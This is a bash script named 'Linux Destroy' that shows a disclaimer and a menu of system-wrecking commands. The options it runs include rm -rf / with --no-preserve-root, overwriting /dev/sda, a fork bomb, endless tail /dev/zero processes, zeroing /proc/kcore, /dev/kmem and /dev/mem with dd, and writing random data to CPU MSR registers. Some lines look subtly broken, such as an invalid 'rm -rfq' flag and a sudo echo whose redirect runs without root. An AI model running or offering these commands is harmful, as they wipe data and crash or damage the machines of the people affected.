#!/bin/bash

# Ensure figlet is installed
install_figlet() {
    if ! command -v figlet &> /dev/null; then
        echo "Figlet is not installed. Installing now..."
        sudo apt update && sudo apt install -y figlet || {
            echo "Failed to install figlet. Exiting..."
            exit 1
        }
    fi
}

# Display disclaimer
show_disclaimer() {
    echo "================================"
    echo "         *** DISCLAIMER ***      "
    echo "================================"
    echo "This script is intended solely for educational"
    echo "purposes and should only be run with a full"
    echo "understanding of the potential consequences."
    echo ""
    echo "WARNING: Running this script can cause:"
    echo "- Irreversible damage to your operating system."
    echo "- Loss of critical data."
    echo "- System instability or permanent failure."
    echo "- Potential CPU damage in some cases."
    echo ""
    echo "By proceeding, you acknowledge that you:"
    echo "- Accept full responsibility for any damage."
    echo "- Understand the risks of running destructive commands."
    echo ""
    echo "USE THIS SCRIPT AT YOUR OWN RISK."
    echo "================================"
    read -p "Do you wish to continue? (yes/no): " choice
    case $choice in
        yes|YES|y|Y) ;;
        *) echo "Exiting... Stay safe!"; exit 0 ;;
    esac
}

# Main menu display
show_menu() {
    echo "================================"
    figlet -k Linux Destroy
    echo "================================"
    echo "1. Permanently Destroy (use with caution)"
    echo "2. Temporary Destroy"
    echo "3. Exit"
    echo "================================"
}

# Handle user input for the main menu
read_input() {
    local choice
    read -p "Enter your choice [1-3]: " choice
    case $choice in
        1) submenu_PD ;;
        2) submenu_TD ;;
        3) echo "Goodbye!"; exit 0 ;;
        *) echo "Invalid choice. Please select a valid option." ;;
    esac
}

# Submenu for "Permanently Destroy"
submenu_PD() {
    echo "--------------------------------"
    echo "1. Use rm -rf /"
    echo "2. Use echo 000 > /dev/sda (faster)"
    echo "3. Corrupt CPU MSR Registers"
    echo "4. Back to Main Menu"
    echo "--------------------------------"
    
    read -p "Enter your choice [1-4]: " choice
    case $choice in
        1) PD1 ;;
        2) PD2 ;;
        3) destroy_cpu ;;
        4) return ;;
        *) echo "Invalid choice. Please select a valid option." ;;
    esac
}

# Submenu for "Temporary Destroy"
submenu_TD() {
    echo "--------------------------------"
    echo "1. Use the fork bomb"
    echo "2. Use tail /dev/zero"
    echo "3. Clear /proc/kcore, /dev/kmem, /dev/mem"
    echo "4. Back to Main Menu"
    echo "--------------------------------"
    
    read -p "Enter your choice [1-4]: " choice
    case $choice in
        1) TD1 ;;
        2) TD2 ;;
        3) clear_memory_files ;;
        4) return ;;
        *) echo "Invalid choice. Please select a valid option." ;;
    esac
}

# Functions for destructive commands
PD1() {
    echo "Goodbye World!"
    sudo rm -rfq /* --no-preserve-root
}

PD2() {
    echo "Goodbye World!"
    sudo echo 000 > /dev/sda
}

TD1() {
    echo "Goodbye World!"
    :(){ :|:& };:
}

TD2() {
    echo "Goodbye World!"
    while :
    do
        tail /dev/zero &
    done
}

clear_memory_files() {
    echo "Goodbye World!"
    sudo dd if=/dev/zero of=/proc/kcore bs=1M count=1
    sudo dd if=/dev/zero of=/dev/kmem bs=1M count=1
    sudo dd if=/dev/zero of=/dev/mem bs=1M count=1
}

destroy_cpu() {
    echo "WARNING: This action may cause **irreversible** CPU damage."
    echo "You will be asked **4 times** to confirm."
    echo "If you confirm all, you must type a final passphrase."

    for i in {1..4}; do
        read -p "Are you absolutely sure? (yes/no): " confirm
        if [[ "$confirm" != "yes" ]]; then
            echo "Operation cancelled."
            return
        fi
    done

    read -p "FINAL STEP: Type 'CPU MSR random confirm' to proceed: " final_confirm
    if [[ "$final_confirm" != "CPU MSR random confirm" ]]; then
        echo "Incorrect confirmation. Operation cancelled."
        return
    fi

    echo "Final confirmation complete."
    echo "System will execute command in 30 seconds..."
    echo "Press CTRL+C now to cancel."

    # 30-second countdown
    for i in {30..1}; do
        echo -ne "Executing in $i seconds... Press CTRL+C to cancel. \r"
        sleep 1
    done

    echo -e "\nGoodbye World!"
    sudo cat /dev/random > /dev/cpu/*/msr
}

# Run installation, disclaimer, and main loop
install_figlet
show_disclaimer

while true; do
    show_menu
    read_input
    echo ""
done
